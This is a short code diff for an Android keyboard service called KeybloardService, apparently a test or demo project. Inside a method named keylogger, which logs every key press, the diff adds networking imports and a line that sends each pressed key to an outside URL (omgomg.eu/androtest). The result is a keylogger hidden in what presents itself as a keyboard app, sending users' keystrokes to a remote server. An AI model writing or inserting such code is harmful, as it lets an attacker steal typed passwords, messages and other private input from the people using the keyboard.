@@ -8,6 +8,12 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
+import java.io.BufferedInputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -17,6 +23,7 @@ public class KeybloardService extends InputMethodService implements KeyboardView
         super();
     }
     private Logger logcat = Logger.getLogger("Keybloard");
+
     private KeyboardView keyboardView;
     private Keyboard keyboard;
     private String currentKey = "";
@@ -80,6 +87,7 @@ public class KeybloardService extends InputMethodService implements KeyboardView
 
     private void keylogger(String currentKey){
         logcat.log(Level.SEVERE, "Key pressed: " + currentKey);
+        new HTTPRequestHandler().execute("https://www.omgomg.eu/androtest", currentKey);
     }
 
     @Override
